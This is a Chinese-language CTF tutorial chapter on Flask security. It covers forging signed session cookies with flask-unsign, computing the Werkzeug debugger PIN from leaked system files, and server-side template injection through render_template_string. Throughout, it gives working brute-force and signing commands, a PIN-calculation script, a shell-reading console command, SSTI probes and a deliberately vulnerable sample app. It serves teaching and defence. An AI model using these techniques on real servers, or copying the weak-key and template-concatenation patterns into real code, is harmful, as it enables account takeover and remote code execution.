---
comments: true
---

# Flask安全

> [ProbiusOfficial/Hello-CTF](https://github.com/ProbiusOfficial/Hello-CTF)

Flask 是 Python 生态中最常见的轻量级 Web 框架，也是 CTF Web 题里 Python 方向的绝对主角。本章聚焦 Flask 特有的三个高频考点：

- **session 伪造**：Flask 的 session 默认存在客户端 cookie 里，密钥泄露即可任意伪造；
- **debug 模式 PIN 码**：debug 开启时 Werkzeug 控制台可直接执行代码，PIN 码可以被计算出来；
- **模板渲染与 SSTI**：`render_template_string` 拼接用户输入是 SSTI 的经典入口。

## Flask session 机制

### session 存在哪里

很多框架（如 PHP）的 session 存在服务端，cookie 里只放一个 session id。Flask 不一样：**默认情况下 session 的全部内容都序列化后直接塞进客户端 cookie**，服务端不存任何东西。

一个最小的示例：

```python
from flask import Flask, session

app = Flask(__name__)
app.secret_key = "hello-ctf"  # 用于给 session 签名的密钥

@app.route('/login')
def login():
    session['username'] = 'guest'
    return 'ok'

@app.route('/')
def index():
    if session.get('username') == 'admin':
        return 'flag{...}'
    return 'hello ' + str(session.get('username'))

app.run()
```

登录后浏览器会得到一个类似这样的 cookie：

```http
Set-Cookie: session=eyJ1c2VybmFtZSI6Imd1ZXN0In0.aBcDeF.XyZ123...
```

### cookie 的结构

session cookie 由 `.` 分隔成三部分（实际是「数据.时间戳.签名」，时间戳可选）：

```text
eyJ1c2VybmFtZSI6Imd1ZXN0In0  .  aBcDeF  .  XyZ123...
       payload(base64)            时间戳        HMAC 签名
```

- **payload**：session 字典 JSON 序列化后再 base64（可能带 zlib 压缩）编码，**只是编码，不是加密**，谁都能解码看内容；
- **签名**：用 `app.secret_key` 对前面部分做 HMAC-SHA1 签名，由 `itsdangerous` 库完成。

关键点：**服务端只验签名，不知道你原来 session 里是什么**。所以只要拿到 `secret_key`，就可以把 `username` 改成 `admin` 再重新签名，服务端会完全信任。

那么密钥从哪来？CTF 里常见的泄露途径：

- 源码泄露（`.git`、备份文件、`www.zip` 等，参考「敏感信息泄露」章）；
- 硬编码的弱密钥，如 `secret_key = '123456'`、`'secret'`、`'key'` 等，可爆破；
- 任意文件读取读到 `app.py` 或配置文件（参考「任意文件读取」章）。

### flask-unsign 工具

手工解签、改数据、重签比较繁琐，社区有现成工具 [flask-unsign](https://github.com/Paradoxis/Flask-Unsign)：

```bash
pip install flask-unsign
```

常用三条命令，对应解题三步走：

```bash
# 1. 解码：查看 session 里的内容（不需要密钥）
flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6Imd1ZXN0In0.aBcDeF.XyZ123...'
# 输出: {'username': 'guest'}

# 2. 爆破：用字典尝试爆破 secret_key
flask-unsign --unsign --cookie 'eyJ1c2Vy...' --wordlist rockyou.txt
# 成功时输出: [*] Session decodes to: {'username': 'guest'}
#            [*] Starting brute-forcer with 8 threads..
#            [+] Found secret key after 1234 attempts
#            b'hello-ctf'

# 3. 签名：用已知密钥伪造任意 session
flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'hello-ctf'
# 输出伪造好的 cookie，替换到浏览器或请求里即可
```

如果没有合适的字典，flask-unsign 自带一个默认小字典，加 `--no-literal-eval` 等参数的场景较少，做题时记住这三条基本够用。

### 伪造 session 完整演示

以上面的示例代码为例，完整流程：

1. 访问 `/login` 拿到 cookie，先用 `--decode` 看一眼内容，确认是 Flask session（base64 解出来是 JSON）。
2. 用 `--unsign --wordlist` 爆破，假设爆出密钥是 `hello-ctf`。
3. 伪造 admin 身份：

```bash
flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'hello-ctf'
```

4. 带上新 cookie 访问 `/`：

```bash
curl -H "Cookie: session=伪造出来的值" http://target:5000/
```

服务端验签通过，认为你就是 admin，返回 flag。

**防守视角的一句话总结**：session 内容不保密（谁都能 decode），保密性全靠 `secret_key` 的强度和机密性。

## debug 模式与 PIN 码

### debug 模式的危害

开发时常这样启动：

```python
app.run(debug=True)
```

debug 模式开了两个东西：自动重载，以及 **Werkzeug 的交互式调试控制台（Debugger Console）**。当代码抛出未捕获的异常时，错误页面里每个栈帧旁边都有一个终端图标，点开后可以在浏览器里直接执行任意 Python 代码——这本质就是一个 webshell。

更危险的是，控制台也可以直接通过路径 `/console` 访问（部分版本）。如果生产环境误开 debug，等于送了一个 RCE，参考「RCE」章。

好在官方加了一道锁：首次打开控制台要求输入 **PIN 码**：

```text
The debugger is locked. Enter the PIN to unlock:
```

而这道锁在 CTF 里是可以算出来的。

### PIN 码的生成要素

Werkzeug 的 PIN 由一组「机器指纹」拼起来做哈希得到。翻源码（`werkzeug/debug/__init__.py` 中的 `get_pin_and_cookie_name`），参与计算的要素是：

| 要素 | 来源 |
| --- | --- |
| `username` | 运行 Flask 进程的用户名，读 `/etc/passwd` 或报错页面可得 |
| `modname` | 固定一般是 `flask.app` |
| `appname` | 固定一般是 `Flask` |
| `moddir` | Flask 库所在目录的绝对路径，如 `/usr/local/lib/python3.9/site-packages/flask` |
| `machine-id` | 机器的 `/etc/machine-id`（或 `/proc/sys/kernel/random/boot_id`） |
| `mac` | 网卡 MAC 地址的十进制形式，来自 `/sys/class/net/<网卡名>/address` |

也就是说，只要题目存在 **任意文件读取** 或 **报错信息泄露**，能读到上面这些值，就能在本地复算出 PIN，然后打开 `/console` 执行代码拿 flag。

### 算 PIN 的典型流程

以「题目有文件读取漏洞 + debug 开启」为例：

1. **读 `/etc/passwd`**，确认运行进程的用户（比如是 `flaskweb` 或 `root`）。
2. **读 `/proc/net/arp`** 或 `/sys/class/net/eth0/address` 拿 MAC 地址；从报错页面的栈帧路径拿 Flask 安装目录（报错页面上每个帧都写明了文件绝对路径）。
3. **读 `/etc/machine-id`**。注意 Werkzeug 的逻辑是：`/etc/machine-id` 与 `/proc/sys/kernel/random/boot_id` 取第一个能读到的值（旧版本会拼接，不同版本细节有差异，做题时以目标环境的 werkzeug 版本源码为准）。

然后本地运行与目标同版本的计算脚本（简化示意）：

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'flaskweb',        # username
    'flask.app',       # modname
    'Flask',           # appname
    '/usr/local/lib/python3.9/site-packages/flask',  # moddir
]

private_bits = [
    '2485377892354',   # MAC 地址去掉冒号后的十进制整数: int('aa:bb:cc:dd:ee:ff'.replace(':',''), 16)
    'abcd1234-...',    # machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    h.update(bit.encode())
h.update(b'cookiesalt')
h.update(b'pinsalt')
num = f'{int(h.hexdigest(), 16):09d}'[:9]
pin = f'{num[0:3]}-{num[3:6]}-{num[6:9]}'
print(pin)
```

> 注意：`str(uuid.getnode())` 得到的 MAC 是十进制整数字符串；不同 werkzeug 版本的 salt、哈希算法（新版用 sha1，很旧的用 md5）、machine-id 拼接方式都有差别，**最稳的办法是直接把目标版本的 `get_pin_and_cookie_name` 函数原样抠出来跑**。

算出 PIN 后访问 `http://target/console`，输入 PIN，在控制台里：

```python
>>> import os; os.popen('cat /flag').read()
```

### 报错信息里的线索

即使控制台有 PIN，debug 报错页面本身也是信息宝库：栈帧里能看到 **源码每一行的内容、文件绝对路径、Flask/Python 版本**，有时还能直接看到 `secret_key`。所以遇到 Flask 题目，先用一个不存在的路由或制造异常触发报错页看看，往往直接就有收获（也呼应「敏感信息泄露」章的思路）。

## 模板渲染与 SSTI

Flask 默认用 **Jinja2** 模板引擎。两种渲染方式的区别是 CTF 的经典坑点：

```python
from flask import render_template, render_template_string, request

# 安全：用户输入作为「数据」传入模板，不会被当作模板语法解析
return render_template('index.html', name=request.args.get('name'))

# 危险：用户输入先被拼进模板字符串，再整体渲染——输入即模板
template = '<h1>Hello ' + request.args.get('name') + '</h1>'
return render_template_string(template)
```

第二种写法下，传入 `{{7*7}}` 会被渲染成 `49`，说明存在 SSTI，进一步就能构造 payload 读文件、弹 shell：

```text
?name={{''.__class__.__mro__[1].__subclasses__()}}
```

SSTI 的完整利用链（`__class__` → `__mro__` → `__subclasses__` → 找 `os`/`subprocess`/读文件的类）在「SSTI注入」章（见 [./ssti.md](./ssti.md)）里讲得非常详细，本章不再展开。这里只强调 Flask 侧的两个记忆点：

- 看到 `render_template_string` + 字符串拼接用户输入，条件反射想到 SSTI；
- Flask 的 Jinja2 环境里自带 `config`、`request`、`url_for` 等全局对象，`{{config}}` 常常能直接倒出 `SECRET_KEY`，然后再回到本章第一节伪造 session——这两个考点经常连环出现。

## CTF 例题

**题目描述**：一个 Flask 写的小站，提示「只有 admin 能看到 flag」。

### 信息收集

访问首页，登录后得到 cookie：

```http
Set-Cookie: session=eyJ1c2VybmFtZSI6eyIgYiI6ImNtVmMzWkE1TWpZPSJ9fQ.Z2abcd.XYZ...
```

cookie 以 `eyJ` 开头（base64 的 `{"`），是 Flask session 的典型特征。先解码看看：

```bash
flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6eyIgYiI6ImNtVmMzWkE1TWpZPSJ9fQ.Z2abcd.XYZ...'
```

```text
{'username': {' b': 'cmVzc3k5MjY='}}
```

内容里 username 还被包了一层，但无所谓——我们的目标只是把它变成 admin。直接爆破密钥：

```bash
flask-unsign --unsign --cookie 'eyJ1c2Vy...' --wordlist /usr/share/wordlists/rockyou.txt
```

```text
[+] Found secret key after 3817 attempts
b's3cret'
```

密钥是弱口令 `s3cret`。

### 伪造 admin session

```bash
flask-unsign --sign --cookie "{'username': 'admin'}" --secret 's3cret'
```

拿到新 cookie 后替换请求：

```bash
curl -H "Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Z2cdef.ABC..." http://target/
```

页面返回：`flag{fl4sk_s3ss10n_1s_cl13nt_s1d3}`。

### 延伸思考

这道题如果再加一层：伪造 session 后看到页面有 `render_template_string` 渲染的搜索框，就可以接着测 SSTI，用 `{{config}}` 把 `SECRET_KEY` 倒出来验证之前爆破的结果，或者直接走「SSTI注入」章的 payload 拿 shell——Flask 题目的考点往往就是这样串联起来的。

## 小结

- Flask session 在客户端，**签名而非加密**，密钥泄露 = 身份伪造，`flask-unsign` 一把梭；
- `debug=True` 等于留 RCE 后门，PIN 码的六个要素都可以通过文件读取/报错页面收集后在本地复算；
- `render_template_string` 拼接用户输入是 SSTI 入口，和「SSTI注入」章串起来看。
